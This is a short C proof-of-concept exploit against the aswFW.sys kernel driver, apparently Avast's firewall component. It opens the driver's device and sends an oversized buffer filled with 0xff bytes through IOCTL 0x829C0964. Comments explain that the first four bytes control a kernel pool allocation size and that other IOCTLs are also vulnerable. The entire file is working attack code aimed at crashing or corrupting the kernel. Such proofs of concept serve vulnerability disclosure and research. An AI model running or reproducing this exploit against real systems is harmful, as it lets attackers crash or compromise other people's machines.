#include "stdafx.h"
#include "windows.h"
#include "winioctl.h"
#include "stdio.h"
 
int main(void)
{
  HANDLE hFile = NULL;
  ULONG ioctl_code = 0;
  CHAR outBuf[32];
  CHAR rpt_inBuf[102400];
  DWORD dwRet = 0, ret = 0;
 
  hFile = CreateFile("\\\\.\\aswFW", FILE_SHARE_READ | FILE_SHARE_WRITE,
                     0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
                     NULL);
  if(hFile == INVALID_HANDLE_VALUE){
        fprintf(stderr, "failed to open 'aswFW.sys' kernel driver!\n");
    return(-1);
  }
 
  rpt_inBuf[0] = '\xff'; // first 4 byte wiil uses calculate
  rpt_inBuf[1] = '\xff'; // allication size of ExAllocatePoolWithTag.
  rpt_inBuf[2] = '\xff'; // and it is [Irp+0Ch] as User Controlled Buffer.
  rpt_inBuf[3] = '\xff';
  memset((rpt_inBuf+4), 0xff, 102394);
 
  // IOCTL Code = 0x829C0964 ( IOCTL_ASWFW_COMM_PIDINFO_RESULTS )
  // ( another IOCTL Code also vulnerable )
  ret = DeviceIoControl(hFile, 0x829C0964,
        (PVOID)rpt_inBuf, 102398, outBuf, 32, &dwRet, NULL);
 
  return 0;
}